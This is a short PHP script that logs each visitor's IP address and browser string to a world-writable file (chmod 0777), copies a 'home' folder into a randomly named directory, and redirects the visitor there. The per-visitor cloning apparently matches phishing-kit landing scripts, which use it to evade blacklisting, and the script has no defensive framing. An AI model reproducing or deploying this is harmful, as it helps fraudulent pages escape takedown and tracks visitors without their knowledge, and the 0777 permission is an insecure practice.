<?php
$iplogfile = 'visite.log';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$webpage = $_SERVER['SCRIPT_NAME'];
$timestamp = date('m/d/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$browser. "\r\n");
fclose($fp);
$random = rand(0,1900000).$_SERVER['REMOTE_ADDR'];
$dst		= substr(md5($random), 0, 6);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="home";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;

?>